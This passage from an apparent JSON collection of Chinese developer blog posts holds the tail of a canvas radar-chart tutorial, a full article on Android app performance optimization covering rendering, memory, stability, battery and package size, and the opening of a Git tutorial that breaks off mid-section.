ctx.textAlign=\"center\";\n    for (var i = 0; i < 6; i++) {\n        var y = rCenter + curR * Math.cos(rAngle * i);\n        var x = rCenter + curR * Math.sin(rAngle * i);\n        var M_width = ctx.measureText(rData[i][1]).width;\n        if ( x == rCenter) {\n            if (y > rCenter ) {\n                ctx.fillText(rData[i][1], x + M_width/2, y + fontSize);\n            } else {\n                ctx.fillText(rData[i][1], x + M_width/2, y - fontSize);\n            }\n        } else if ( x > rCenter) {\n            console.log(rData[i][0]);\n            ctx.fillText(rData[i][1], x + M_width, y);\n        } else {\n             ctx.fillText(rData[i][1], x - M_width, y);\n        }\n    }\n    ctx.restore();\n    ctx.save();\n页面最终效果：\n\n\n结尾\n好了！以上就是鄙人对于canvas绘画一点简单理解与复习了，其中也回顾了一些canvas基本属性点。后续如何用canvas玩出各种花样就看各位看官自己了！\n小贴士：\n在使用ctx.measureText这个方法的时候需要注意一下。这个方法在宽度参考对象也跟当前绘画环境的font-size有关联的。\n打个比方说，在绘制描述的文本的时候。font-size设置是16px，那么ctx.measureText('输出').width 是32。\n那么在绘制能力等级的时候，font-size设置是32，那么ctx.measureText('输出').width 就不再是32了而是64或者。\n贴士2：\n这里顺便帮做设计朋友推广他的一个微信H5视频案例，全程水墨画武侠风，画工炒鸡棒棒。\n\n\n另外前面loading动画宝剑出鞘css3部分，利用极少transform3d代码完成。感兴趣的童鞋可以微信扫一扫，看一下运动轨迹就心中估计就能猜出运行的的css3代码了。\n\n原创文章，文笔有限，才疏学浅，文中若有不正之处，再次再次再次欢迎各位啪啪的打脸赐教。（有句话说的好，重要的词得说三遍。）\n\n我是车大棒！我为我自己……emmmmmmm，今天就不自己带眼了，为朋友插眼吧！\n"},{"title":"Android APP 性能优化的一些思考","body":"说到 Android 系统手机，大部分人的印象是用了一段时间就变得有点卡顿，有些程序在运行期间莫名其妙的出现崩溃，打开系统文件夹一看，发现多了很多文件，然后用手机管家 APP 不断地进行清理优化 ，才感觉运行速度稍微提高了点，就算手机在各种性能跑分软件面前分数遥遥领先，还是感觉无论有多大的内存空间都远远不够用。相信每个使用 Android 系统的用户都有过以上类似经历，确实，Android 系统在流畅性方面不如 IOS 系统，为何呢，明明在看手机硬件配置上时，Android 设备都不会输于 IOS 设备，甚至都强于它，关键是在于软件上。造成这种现象的原因是多方面的，简单罗列几点如下：\n\n其实近年来，随着 Android 版本不断迭代，Google 提供的Android 系统已经越来越流畅，目前最新发布的版本是 Android 8.0 Oreo 。但是在国内大部分用户用的 Android 手机系是各大厂商定制过的版本，往往不是最新的原生系统内核，可能绝大多数还停留在 Android 5.0 系统上，甚至 Android 6.0 以上所占比例还偏小，更新存在延迟性。\n由于 Android 系统源码是开放的，每个人只要遵从相应的协议，就可以对源码进行修改，那么国内各个厂商就把基于 Android 源码改造成自己对外发布的系统，比如我们熟悉的小米手机 Miui 系统、华为手机 EMUI 系统、Oppo 手机 ColorOS 系统等。由于每个厂商都修改过 Android 原生系统源码，这里面就会引发一个问题，那就是著名的Android 碎片化问题，本质就是不同 Android 系统的应用兼容性不同，达不到一致性。\n由于存在着各种 Android 碎片化和兼容性问题，导致 Android 开发者在开发应用时需要对不同系统进行适配，同时每个 Android 开发者的开发水平参差不齐，写出来的应用性能也都存在不同类型的问题，导致用户在使用过程中用户体验感受不同，那么有些问题用户就会转化为 Android 系统问题，进而影响对Android 手机的评价。\n\n性能优化\n今天想说的重点是Android APP  性能优化，也就是在开发应用程序时应该注意的点有哪些，如何更好地提高用户体验。一个好的应用，除了要有吸引人的功能和交互之外，在性能上也应该有高的要求，即时应用非常具有特色，在产品前期可能吸引了部分用户，但是用户体验不好的话，也会给产品带来不好的口碑。那么一个好的应用应该如何定义呢？主要有以下三方面：\n\n业务/功能\n符合逻辑的交互\n优秀的性能\n\n众所周知，Android 系统作为以移动设备为主的操作系统，硬件配置是有一定的限制的，虽然配置现在越来越高级，但仍然无法与 PC 相比，在 CPU 和内存上使用不合理或者耗费资源多时，就会碰到内存不足导致的稳定性问题、CPU 消耗太多导致的卡顿问题等。\n面对问题时，大家想到的都是联系用户，然后查看日志，但殊不知有关性能类问题的反馈，原因也非常难找，日志大多用处不大，为何呢？因为性能问题大部分是非必现的问题，问题定位很难复现，而又没有关键的日志，当然就无法找到原因了。这些问题非常影响用户体验和功能使用，所以了解一些性能优化的一些解决方案就显得很重要了，并在实际的项目中优化我们的应用，进而提高用户体验。\n四个方面\n可以把用户体验的性能问题主要总结为4个类别：\n\n流畅\n稳定\n省电、省流量\n安装包小\n\n性能问题的主要原因是什么，原因有相同的，也有不同的，但归根到底，不外乎内存使用、代码效率、合适的策略逻辑、代码质量、安装包体积这一类问题，整理归类如下：\n\n从图中可以看到，打造一个高质量的应用应该以4个方向为目标：快、稳、省、小。\n快：使用时避免出现卡顿，响应速度快，减少用户等待的时间，满足用户期望。\n稳：减低 crash 率和 ANR 率，不要在用户使用过程中崩溃和无响应。\n省：节省流量和耗电，减少用户使用成本，避免使用时导致手机发烫。\n小：安装包小可以降低用户的安装成本。\n要想达到这4个目标，具体实现是在右边框里的问题：卡顿、内存使用不合理、代码质量差、代码逻辑乱、安装包过大，这些问题也是在开发过程中碰到最多的问题，在实现业务需求同时，也需要考虑到这点，多花时间去思考，如何避免功能完成后再来做优化，不然的话等功能实现后带来的维护成本会增加。\n卡顿优化\nAndroid 应用启动慢，使用时经常卡顿，是非常影响用户体验的，应该尽量避免出现。卡顿的场景有很多，按场景可以分为4类：UI 绘制、应用启动、页面跳转、事件响应，如图：\n\n这4种卡顿场景的根本原因可以分为两大类：\n\n界面绘制。主要原因是绘制的层级深、页面复杂、刷新不合理，由于这些原因导致卡顿的场景更多出现在 UI 和启动后的初始界面以及跳转到页面的绘制上。\n数据处理。导致这种卡顿场景的原因是数据处理量太大，一般分为三种情况，一是数据在处理 UI 线程，二是数据处理占用 CPU 高，导致主线程拿不到时间片，三是内存增加导致 GC 频繁，从而引起卡顿。\n\n引起卡顿的原因很多，但不管怎么样的原因和场景，最终都是通过设备屏幕上显示来达到用户，归根到底就是显示有问题，所以，要解决卡顿，就要先了解 Android 系统的显示原理。\nAndroid系统显示原理\nAndroid 显示过程可以简单概括为：Android 应用程序把经过测量、布局、绘制后的 surface 缓存数据，通过 SurfaceFlinger 把数据渲染到显示屏幕上， 通过 Android 的刷新机制来刷新数据。也就是说应用层负责绘制，系统层负责渲染，通过进程间通信把应用层需要绘制的数据传递到系统层服务，系统层服务通过刷新机制把数据更新到屏幕上。\n我们都知道在 Android 的每个 View 绘制中有三个核心步骤：Measure、Layout、Draw。具体实现是从 ViewRootImp 类的performTraversals() 方法开始执行，Measure 和 Layout都是通过递归来获取 View 的大小和位置，并且以深度作为优先级，可以看出层级越深、元素越多、耗时也就越长。\n真正把需要显示的数据渲染到屏幕上，是通过系统级进程中的 SurfaceFlinger 服务来实现的，那么这个SurfaceFlinger 服务主要做了哪些工作呢？如下：\n\n响应客户端事件，创建 Layer 与客户端的 Surface 建立连接。\n接收客户端数据及属性，修改 Layer 属性，如尺寸、颜色、透明度等。\n将创建的 Layer 内容刷新到屏幕上。\n维持 Layer 的序列，并对 Layer 最终输出做出裁剪计算。\n\n既然是两个不同的进程，那么肯定是需要一个跨进程的通信机制来实现数据传递，在 Android 显示系统中，使用了 Android 的匿名共享内存：SharedClient，每一个应用和 SurfaceFlinger 之间都会创建一个SharedClient ，然后在每个 SharedClient 中，最多可以创建 31 个 SharedBufferStack，每个 Surface 都对应一个 SharedBufferStack，也就是一个 Window。\n一个 SharedClient 对应一个Android 应用程序，而一个 Android 应用程序可能包含多个窗口，即 Surface 。也就是说 SharedClient 包含的是 SharedBufferStack的集合，其中在显示刷新机制中用到了双缓冲和三重缓冲技术。最后总结起来显示整体流程分为三个模块：应用层绘制到缓存区，SurfaceFlinger 把缓存区数据渲染到屏幕，由于是不同的进程，所以使用 Android 的匿名共享内存 SharedClient 缓存需要显示的数据来达到目的。\n除此之外，我们还需要一个名词：FPS。FPS 表示每秒传递的帧数。在理想情况下，60 FPS 就感觉不到卡，这意味着每个绘制时长应该在16 ms 以内。但是 Android 系统很有可能无法及时完成那些复杂的页面渲染操作。Android 系统每隔 16ms 发出 VSYNC 信号，触发对 UI 进行渲染，如果每次渲染都成功，这样就能够达到流畅的画面所需的 60FPS。如果某个操作花费的时间是 24ms ，系统在得到 VSYNC 信号时就无法正常进行正常渲染，这样就发生了丢帧现象。那么用户在 32ms 内看到的会是同一帧画面，这种现象在执行动画或滑动列表比较常见，还有可能是你的 Layout 太过复杂，层叠太多的绘制单元，无法在 16ms 完成渲染，最终引起刷新不及时。\n卡顿根本原因\n根据Android 系统显示原理可以看到，影响绘制的根本原因有以下两个方面：\n\n绘制任务太重，绘制一帧内容耗时太长。\n主线程太忙，根据系统传递过来的 VSYNC 信号来时还没准备好数据导致丢帧。\n\n绘制耗时太长，有一些工具可以帮助我们定位问题。主线程太忙则需要注意了，主线程关键职责是处理用户交互，在屏幕上绘制像素，并进行加载显示相关的数据，所以特别需要避免任何主线程的事情，这样应用程序才能保持对用户操作的即时响应。总结起来，主线程主要做以下几个方面工作：\n\nUI 生命周期控制\n系统事件处理\n消息处理\n界面布局\n界面绘制\n界面刷新\n\n除此之外，应该尽量避免将其他处理放在主线程中，特别复杂的数据计算和网络请求等。\n性能分析工具\n性能问题并不容易复现，也不好定位，但是真的碰到问题还是需要去解决的，那么分析问题和确认问题是否解决，就需要借助相应的的调试工具，比如查看 Layout 层次的 Hierarchy View、Android 系统上带的 GPU Profile 工具和静态代码检查工具 Lint 等，这些工具对性能优化起到非常重要的作用，所以要熟悉，知道在什么场景用什么工具来分析。\n1，Profile GPU Rendering\n在手机开发者模式下，有一个卡顿检测工具叫做：Profile GPU Rendering，如图：\n\n它的功能特点如下：\n\n一个图形监测工具，能实时反应当前绘制的耗时\n横轴表示时间，纵轴表示每一帧的耗时\n随着时间推移，从左到右的刷新呈现\n提供一个标准的耗时，如果高于标准耗时，就表示当前这一帧丢失\n\n2，TraceView\nTraceView 是 Android SDK 自带的工具，用来分析函数调用过程，可以对 Android 的应用程序以及 Framework 层的代码进行性能分析。它是一个图形化的工具，最终会产生一个图表，用于对性能分析进行说明，可以分析到每一个方法的执行时间，其中可以统计出该方法调用次数和递归次数，实际时长等参数维度，使用非常直观，分析性能非常方便。\n3，Systrace UI 性能分析\nSystrace 是 Android 4.1及以上版本提供的性能数据采样和分析工具，它是通过系统的角度来返回一些信息。它可以帮助开发者收集 Android 关键子系统，如 surfaceflinger、WindowManagerService 等 Framework 部分关键模块、服务、View系统等运行信息，从而帮助开发者更直观地分析系统瓶颈，改进性能。Systrace 的功能包括跟踪系统的 I/O 操作、内核工作队列、CPU 负载等，在 UI 显示性能分析上提供很好的数据，特别是在动画播放不流畅、渲染卡等问题上。\n优化建议\n1，布局优化\n布局是否合理主要影响的是页面测量时间的多少，我们知道一个页面的显示测量和绘制过程都是通过递归来完成的，多叉树遍历的时间与树的高度h有关，其时间复杂度 O(h)，如果层级太深，每增加一层则会增加更多的页面显示时间，所以布局的合理性就显得很重要。\n那布局优化有哪些方法呢，主要通过减少层级、减少测量和绘制时间、提高复用性三个方面入手。总结如下：\n\n减少层级。合理使用 RelativeLayout 和 LinerLayout，合理使用Merge。\n提高显示速度。使用 ViewStub，它是一个看不见的、不占布局位置、占用资源非常小的视图对象。\n布局复用。可以通过 标签来提高复用。\n尽可能少用wrap_content。wrap_content 会增加布局 measure 时计算成本，在已知宽高为固定值时，不用wrap_content 。\n删除控件中无用的属性。\n\n2，避免过度绘制\n过度绘制是指在屏幕上的某个像素在同一帧的时间内被绘制了多次。在多层次重叠的 UI 结构中，如果不可见的 UI 也在做绘制的操作，就会导致某些像素区域被绘制了多次，从而浪费了多余的 CPU 以及 GPU 资源。\n如何避免过度绘制呢，如下：\n\n布局上的优化。移除 XML 中非必须的背景，移除 Window 默认的背景、按需显示占位背景图片\n自定义View优化。使用 canvas.clipRect()来帮助系统识别那些可见的区域，只有在这个区域内才会被绘制。\n\n3，启动优化\n通过对启动速度的监控，发现影响启动速度的问题所在，优化启动逻辑，提高应用的启动速度。启动主要完成三件事：UI 布局、绘制和数据准备。因此启动速度优化就是需要优化这三个过程：\n\nUI 布局。应用一般都有闪屏页，优化闪屏页的 UI 布局，可以通过 Profile GPU Rendering 检测丢帧情况。\n启动加载逻辑优化。可以采用分布加载、异步加载、延期加载策略来提高应用启动速度。\n数据准备。数据初始化分析，加载数据可以考虑用线程初始化等策略。\n\n4，合理的刷新机制\n在应用开发过程中，因为数据的变化，需要刷新页面来展示新的数据，但频繁刷新会增加资源开销，并且可能导致卡顿发生，因此，需要一个合理的刷新机制来提高整体的 UI 流畅度。合理的刷新需要注意以下几点：\n\n尽量减少刷新次数。\n尽量避免后台有高的 CPU 线程运行。\n缩小刷新区域。\n\n5，其他\n在实现动画效果时，需要根据不同场景选择合适的动画框架来实现。有些情况下，可以用硬件加速方式来提供流畅度。\n内存优化\n在 Android 系统中有个垃圾内存回收机制，在虚拟机层自动分配和释放内存，因此不需要在代码中分配和释放某一块内存，从应用层面上不容易出现内存泄漏和内存溢出等问题，但是需要内存管理。Android 系统在内存管理上有一个 Generational Heap Memory 模型，内存回收的大部分压力不需要应用层关心， Generational Heap Memory 有自己一套管理机制，当内存达到一个阈值时，系统会根据不同的规则自动释放系统认为可以释放的内存，也正是因为 Android 程序把内存控制的权力交给了 Generational Heap Memory，一旦出现内存泄漏和溢出方面的问题，排查错误将会成为一项异常艰难的工作。除此之外，部分 Android 应用开发人员在开发过程中并没有特别关注内存的合理使用，也没有在内存方面做太多的优化，当应用程序同时运行越来越多的任务，加上越来越复杂的业务需求时，完全依赖 Android 的内存管理机制就会导致一系列性能问题逐渐呈现，对应用的稳定性和性能带来不可忽视的影响，因此，解决内存问题和合理优化内存是非常有必要的。\nAndroid内存管理机制\nAndroid 应用都是在 Android 的虚拟机上运行，应用 程序的内存分配与垃圾回收都是由虚拟机完成的。在 Android 系统，虚拟机有两种运行模式：Dalvik 和 ART。\n1，Java对象生命周期\n\n一般Java对象在虚拟机上有7个运行阶段：\n创建阶段->应用阶段->不可见阶段->不可达阶段->收集阶段->终结阶段->对象空间重新分配阶段\n2，内存分配\n在 Android 系统中，内存分配实际上是对堆的分配和释放。当一个 Android 程序启动，应用进程都是从一个叫做 Zygote 的进程衍生出来，系统启动 Zygote 进程后，为了启动一个新的应用程序进程，系统会衍生 Zygote 进程生成一个新的进程，然后在新的进程中加载并运行应用程序的代码。其中，大多数的 RAM pages 被用来分配给Framework 代码，同时促使 RAM 资源能够在应用所有进程之间共享。\n但是为了整个系统的内存控制需要，Android 系统会为每一个应用程序都设置一个硬性的 Dalvik Heap Size 最大限制阈值，整个阈值在不同设备上会因为 RAM 大小不同而有所差异。如果应用占用内存空间已经接近整个阈值时，再尝试分配内存的话，就很容易引起内存溢出的错误。\n3，内存回收机制\n我们需要知道的是，在 Java 中内存被分为三个区域：Young Generation(年轻代)、Old Generation(年老代)、Permanent Generation(持久代)。最近分配的对象会存放在 Young Generation 区域。对象在某个时机触发 GC 回收垃圾，而没有回收的就根据不同规则，有可能被移动到 Old Generation，最后累积一定时间在移动到 Permanent Generation 区域。系统会根据内存中不同的内存数据类型分别执行不同的 GC 操作。GC 通过确定对象是否被活动对象引用来确定是否收集对象，进而动态回收无任何引用的对象占据的内存空间。但需要注意的是频繁的 GC 会增加应用的卡顿情况，影响应用的流畅性，因此需要尽量减少系统 GC 行为，以便提高应用的流畅度，减小卡顿发生的概率。\n内存分析工具\n做内存优化前，需要了解当前应用的内存使用现状，通过现状去分析哪些数据类型有问题，各种类型的分布情况如何，以及在发现问题后如何发现是哪些具体对象导致的，这就需要相关工具来帮助我们。\n1，Memory Monitor\nMemory Monitor 是一款使用非常简单的图形化工具，可以很好地监控系统或应用的内存使用情况，主要有以下功能：\n\n显示可用和已用内存，并且以时间为维度实时反应内存分配和回收情况。\n快速判断应用程序的运行缓慢是否由于过度的内存回收导致。\n快速判断应用是否由于内存不足导致程序崩溃。\n\n2，Heap Viewer\nHeap Viewer 的主要功能是查看不同数据类型在内存中的使用情况，可以看到当前进程中的 Heap Size 的情况，分别有哪些类型的数据，以及各种类型数据占比情况。通过分析这些数据来找到大的内存对象，再进一步分析这些大对象，进而通过优化减少内存开销，也可以通过数据的变化发现内存泄漏。\n3，Allocation Tracker\nMemory Monitor 和 Heap Viewer 都可以很直观且实时地监控内存使用情况，还能发现内存问题，但发现内存问题后不能再进一步找到原因，或者发现一块异常内存，但不能区别是否正常，同时在发现问题后，也不能定位到具体的类和方法。这时就需要使用另一个内存分析工具 Allocation Tracker，进行更详细的分析， Allocation Tracker 可以分配跟踪记录应用程序的内存分配，并列出了它们的调用堆栈，可以查看所有对象内存分配的周期。\n4，Memory Analyzer Tool(MAT)\nMAT 是一个快速，功能丰富的 Java Heap 分析工具，通过分析 Java 进程的内存快照 HPROF 分析，从众多的对象中分析，快速计算出在内存中对象占用的大小，查看哪些对象不能被垃圾收集器回收，并可以通过视图直观地查看可能造成这种结果的对象。\n常见内存泄漏场景\n如果在内存泄漏发生后再去找原因并修复会增加开发的成本，最好在编写代码时就能够很好地考虑内存问题，写出更高质量的代码，这里列出一些常见的内存泄漏场景，在以后的开发过程中需要避免这类问题。\n\n资源性对象未关闭。比如Cursor、File文件等，往往都用了一些缓冲，在不使用时，应该及时关闭它们。\n注册对象未注销。比如事件注册后未注销，会导致观察者列表中维持着对象的引用。\n类的静态变量持有大数据对象。\n非静态内部类的静态实例。\nHandler临时性内存泄漏。如果Handler是非静态的，容易导致 Activity 或 Service 不会被回收。\n容器中的对象没清理造成的内存泄漏。\nWebView。WebView 存在着内存泄漏的问题，在应用中只要使用一次 WebView，内存就不会被释放掉。\n\n除此之外，内存泄漏可监控，常见的就是用LeakCanary 第三方库，这是一个检测内存泄漏的开源库，使用非常简单，可以在发生内存泄漏时告警，并且生成 leak tarce 分析泄漏位置，同时可以提供 Dump 文件进行分析。\n优化内存空间\n没有内存泄漏，并不意味着内存就不需要优化，在移动设备上，由于物理设备的存储空间有限，Android 系统对每个应用进程也都分配了有限的堆内存，因此使用最小内存对象或者资源可以减小内存开销，同时让GC 能更高效地回收不再需要使用的对象，让应用堆内存保持充足的可用内存，使应用更稳定高效地运行。常见做法如下：\n\n对象引用。强引用、软引用、弱引用、虚引用四种引用类型，根据业务需求合理使用不同，选择不同的引用类型。\n减少不必要的内存开销。注意自动装箱，增加内存复用，比如有效利用系统自带的资源、视图复用、对象池、Bitmap对象的复用。\n使用最优的数据类型。比如针对数据类容器结构，可以使用ArrayMap数据结构，避免使用枚举类型，使用缓存Lrucache等等。\n图片内存优化。可以设置位图规格，根据采样因子做压缩，用一些图片缓存方式对图片进行管理等等。\n\n稳定性优化\nAndroid 应用的稳定性定义很宽泛，影响稳定性的原因很多，比如内存使用不合理、代码异常场景考虑不周全、代码逻辑不合理等，都会对应用的稳定性造成影响。其中最常见的两个场景是：Crash 和 ANR，这两个错误将会使得程序无法使用，比较常用的解决方式如下：\n\n提高代码质量。比如开发期间的代码审核，看些代码设计逻辑，业务合理性等。\n代码静态扫描工具。常见工具有Android Lint、Findbugs、Checkstyle、PMD等等。\nCrash监控。把一些崩溃的信息，异常信息及时地记录下来，以便后续分析解决。\nCrash上传机制。在Crash后，尽量先保存日志到本地，然后等下一次网络正常时再上传日志信息。\n\n耗电优化\n在移动设备中，电池的重要性不言而喻，没有电什么都干不成。对于操作系统和设备开发商来说，耗电优化一致没有停止，去追求更长的待机时间，而对于一款应用来说，并不是可以忽略电量使用问题，特别是那些被归为“电池杀手”的应用，最终的结果是被卸载。因此，应用开发者在实现需求的同时，需要尽量减少电量的消耗。\n在 Android5.0 以前，在应用中测试电量消耗比较麻烦，也不准确，5.0 之后专门引入了一个获取设备上电量消耗信息的 API:Battery Historian。Battery Historian 是一款由 Google 提供的 Android 系统电量分析工具，和Systrace 一样，是一款图形化数据分析工具，直观地展示出手机的电量消耗过程，通过输入电量分析文件，显示消耗情况，最后提供一些可供参考电量优化的方法。\n除此之外，还有一些常用方案可提供：\n\n计算优化，避开浮点运算等。\n避免 WaleLock 使用不当。\n使用 Job Scheduler。\n\n安装包大小优化\n应用安装包大小对应用使用没有影响，但应用的安装包越大，用户下载的门槛越高，特别是在移动网络情况下，用户在下载应用时，对安装包大小的要求更高，因此，减小安装包大小可以让更多用户愿意下载和体验产品。\n常用应用安装包的构成，如图所示：\n\n从图中我们可以看到：\n\nassets文件夹。存放一些配置文件、资源文件，assets不会自动生成对应的 ID，而是通过 AssetManager 类的接口获取。\nres。res 是 resource 的缩写，这个目录存放资源文件，会自动生成对应的 ID 并映射到 .R 文件中，访问直接使用资源 ID。\nMETA-INF。保存应用的签名信息，签名信息可以验证 APK 文件的完整性。\nAndroidManifest.xml。这个文件用来描述 Android 应用的配置信息，一些组件的注册信息、可使用权限等。\nclasses.dex。Dalvik 字节码程序，让 Dalvik 虚拟机可执行，一般情况下，Android 应用在打包时通过 Android SDK 中的 dx 工具将 Java 字节码转换为 Dalvik 字节码。\nresources.arsc。记录着资源文件和资源 ID 之间的映射关系，用来根据资源 ID 寻找资源。\n\n减少安装包大小的常用方案\n\n代码混淆。使用proGuard 代码混淆器工具，它包括压缩、优化、混淆等功能。\n资源优化。比如使用 Android Lint 删除冗余资源，资源文件最少化等。\n图片优化。比如利用 AAPT 工具对 PNG 格式的图片做压缩处理，降低图片色彩位数等。\n避免重复功能的库，使用 WebP图片格式等。\n插件化。比如功能模块放在服务器上，按需下载，可以减少安装包大小。\n\n小结\n性能优化不是更新一两个版本就可以解决的，是持续性的需求，持续集成迭代反馈。在实际的项目中，在项目刚开始的时候，由于人力和项目完成时间限制，性能优化的优先级比较低，等进入项目投入使用阶段，就需要把优先级提高，但在项目初期，在设计架构方案时，性能优化的点也需要提早考虑进去，这就体现出一个程序员的技术功底了。\n什么时候开始有性能优化的需求，往往都是从发现问题开始，然后分析问题原因及背景，进而寻找最优解决方案，最终解决问题，这也是日常工作中常会用到的处理方式。\n"},{"title":"分布式版本控制系统 Git 教程","body":"简介\nGit 是什么？\nGit 是一个开源的分布式版本控制系统。\n什么是版本控制？\n版本控制是一种记录一个或若干文件内容变化，以便将来查阅特定版本修订情况的系统。\n什么是分布式版本控制系统？\n介绍分布式版本控制系统前，有必要先了解一下传统的集中式版本控制系统。\n集中化的版本控制系统，诸如 CVS，Subversion 等，都有一个单一的集中管理的服务器，保存所有文件的修订版本，而协同工作的人们都通过客户端连到这台服务器，取出最新的文件或者提交更新。\n这么做最显而易见的缺点是中央服务器的单点故障。如果宕机一小时，那么在这一小时内，谁都无法提交更新，也就无法协同工作。要是中央服务器的磁盘发生故障，碰巧没做备份，或者备份不够及时，就会有丢失数据的风险。最坏的情况是彻底丢失整个项目的所有历史更改记录。\n\n分布式版本控制系统的客户端并不只提取最新版本的文件快照，而是把代码仓库完整地镜像下来。这么一来，任何一处协同工作用的服务器发生故障，事后都可以用任何一个镜像出来的本地仓库恢复。因为每一次的提取操作，实际上都是一次对代码仓库的完整备份。\n\n为什么使用 Git？\nGit 是分布式的。这是 Git 和其它非分布式的版本控制系统，例如 svn，cvs 等，最核心的区别。分布式带来以下好处：\n工作时不需要联网\n首先，分布式版本控制系统根本没有“中央服务器”，每个人的电脑上都是一个完整的版本库，这样，你工作的时候，就不需要联网了，因为版本库就在你自己的电脑上。既然每个人电脑上都有一个完整的版本库，那多个人如何协作呢？比方说你在自己电脑上改了文件A，你的同事也在他的电脑上改了文件A，这时，你们俩之间只需把各自的修改推送给对方，就可以互相看到对方的修改了。\n更加安全\n集中式版本控制系统，一旦中央服务器出了问题，所有人都无法工作。\n分布式版本控制系统，每个人电脑中都有完整的版本库，所以某人的机器挂了，并不影响其它人。\n原理\n版本库\n当你一个项目到本地或创建一个 git 项目，项目目录下会有一个隐藏的 .git 子目录。这个目录是 git 用来跟踪管理版本库的，千万不要手动修改。\n哈希值\nGit 中所有数据在存储前都计算校验和，然后以校验和来引用。 这意味着不可能在 Git 不知情时更改任何文件内容或目录内容。 这个功能建构在 Git 底层，是构成 Git 哲学不可或缺的部分。 若你在传送过程中丢失信息或损坏文件，Git 就能发现。\nGit 用以计算校验和的机制叫做 SHA-1 散列（hash，哈希）。 这是一个由 40 个十六进制字符（0-9 和 a-f）组成字符串，基于 Git 中文件的内容或目录结构计算出来。 SHA-1 哈希看起来是这样：\n24b9da6552252987aa493b52f8696cd6d3b00373\nGit 中使用这种哈希值的情况很多，你将经常看到这种哈希值。 实际上，Git 数据库中保存的信息都是以文件内容的哈希值来索引，而不是文件名。\n文件状态\n在 GIt 中，你的文件可能会处于三种状态之一：\n\n已修改（modified）\n\n已修改表示修改了文件，但还没保存到数据库中。\n\n已暂存（staged）\n\n已暂存表示对一个已修改文件的当前版本做了标记，使之包含在下次提交的快照中。\n\n已提交（committed）\n\n已提交表示数据已经安全的保存在本地数据库中。 \n工作区域\n与文件状态对应的，不同状态的文件在 Git 中处于不同的工作区域。\n\n工作区（working）\n\n当你 git clone 一个项目到本地，相当于在本地克隆了项目的一个副本。\n工作区是对项目的某个版本独立提取出来的内容。 这些从 Git 仓库的压缩数据库中提取出来的文件，放在磁盘上供你使用或修改。\n\n暂存区（staging）\n\n暂存区是一个文件，保存了下次将提交的文件列表信息，一般在 Git 仓库目录中。 有时候也被称作`‘索引’'，不过一般说法还是叫暂存区。\n\n本地仓库（local）\n\n提交更新，找到暂存区域的文件，将快照永久性存储到 Git 本地仓库。\n\n远程仓库（remote）\n\n以上几个工作区都是在本地。为了让别人可以看到你的修改，你需要将你的更新推送到远程仓库。\n同理，如果你想同步别人的修改，你需要从远程仓库拉取更新。\n\n安装\nLinux\nDebian/Ubuntu\n如果你使用的系统是 Debian/Ubuntu ， 安装命令为：\n$ apt-get install libcurl4-gnutls-dev libexpat1-dev gettext \\\n> libz-dev libssl-dev\n$ apt-get install git-core\n$ git --version\ngit version 1.8.1.2\nCentos/RedHat\n如果你使用的系统是 Centos/RedHat ，安装命令为：\n$ yum install curl-devel expat-devel gettext-devel \\\n> openssl-devel zlib-devel\n$ yum -y install git-core\n$ git --version\ngit version 1.7.1\nWindows\n在Git 官方下载地址下载 exe 安装包。按照安装向导安装即可。\n建议安装 Git Bash 这个 git 的命令行工具。\nMac\n在Git 官方下载地址下载 mac 安装包。按照安装向导安装即可。\n配置\nGit 自带一个 git config 的工具来帮助设置控制 Git 外观和行为的配置变量。 这些变量存储在三个不同的位置：\n\n/etc/gitconfig 文件: 包含系统上每一个用户及他们仓库的通用配置。 如果使用带有 --system 选项的 git config 时，它会从此文件读写配置变量。\n~/.gitconfig 或 ~/.config/git/config 文件：只针对当前用户。 可以传递 --global 选项让 Git 读写此文件。\n当前使用仓库的 Git 目录中的 config 文件（就是 .git/config）：针对该仓库。\n\n每一个级别覆盖上一级别的配置，所以 .git/config 的配置变量会覆盖 /etc/gitconfig 中的配置变量。\n在 Windows 系统中，Git 会查找 $HOME 目录下（一般情况下是 C:\\Users\\$USER）的 .gitconfig 文件。 Git 同样也会寻找 /etc/gitconfig 文件，但只限于 MSys 的根目录下，即安装 Git 时所选的目标位置。\n用户信息\n当安装完 Git 应该做的第一件事就是设置你的用户名称与邮件地址。 这样做很重要，因为每一个 Git 的提交都会使用这些信息，并且它会写入到你的每一次提交中，不可更改：\n$ git config --global user.name \"John Doe\"\n$ git config --global user.email johndoe@example.com\n再次强调，如果使用了 --global 选项，那么该命令只需要运行一次，因为之后无论你在该系统上做任何事情， Git 都会使用那些信息。 当你想针对特定项目使用不同的用户名称与邮件地址时，可以在那个项目目录下运行没有 --global 选项的命令来配置。\n很多 GUI 工具都会在第一次运行时帮助你配置这些信息。\n.gitignore\n.gitignore 文件可能从字面含义也不难猜出：这个文件里配置的文件或目录，会自动被 git 所忽略，不纳入版本控制。\n在日常开发中，我们的项目经常会产生一些临时文件，如编译 Java 产生的 *.class 文件，又或是 IDE 自动生成的隐藏目录（Intellij 的 .idea 目录、Eclipse 的 .settings 目录等）等等。这些文件或目录实在没必要纳入版本管理。在这种场景下，你就需要用到 .gitignore 配置来过滤这些文件或目录。\n配置的规则很简单，也没什么可说的，看几个例子，自然就明白了。\n这里推荐一下 Github 的开源项目：https://github.com/github/gitignore\n在这里，你可以找到很多常用的模板，如：Java、Nodejs、C++ 的 .gitignore 模板等等。\n命令\n国外网友制作了一张 Git Cheat Sheet，总结很精炼，各位不妨收藏一下。\n本节选择性介绍 git 中比较常用的命令行场景。\n\n创建\n克隆一个已创建的仓库\n# 通过 SSH\n$ git clone ssh://user@domain.com/repo.git\n\n#通过 HTTP\n$ git clone http://domain.com/user/repo.git\n创建一个新的本地仓库\n$ git init\n添加修改\n添加修改到暂存区\n# 把指定文件添加到暂存区\n$ git add xxx\n\n# 把当前所有修改添加到暂存区\n$ git add .\n\n# 把所有修改添加到暂存区\n$ git add -A\n提交修改到本地仓库\n# 提交本地的所有修改\n$ git commit -a\n\n# 提交之前已标记的变化\n$ git commit\n\n# 附加消息提交\n$ git commit -m 'commit message'\n储藏\n有时，我们需要在同一个项目的不同分支上工作。当需要切换分支时，偏偏本地的工作还没有完成，此时，提交修改显得不严谨，但是不提交代码又无法切换分支。这时，你可以使用 git stash 将本地的修改内容作为草稿储藏起来。\n官方称之为储藏，但我个人更喜欢称之为存草稿。\n# 1. 将修改作为当前分支的草稿保存\n$ git stash\n\n# 2. 查看草稿列表\n$ git stash list\nstash@{0}: WIP on master: 6fae349 :memo: Writing docs.\n\n# 3.1 删除草稿\n$ git stash drop stash@{0}\n\n# 3.2 读取草稿\n$ git stash apply stash@{0}\n撤销修改\n撤销本地修改\n# 移除缓存区的所有文件（i.e. 撤销上次git add）\n$ git reset HEAD\n\n# 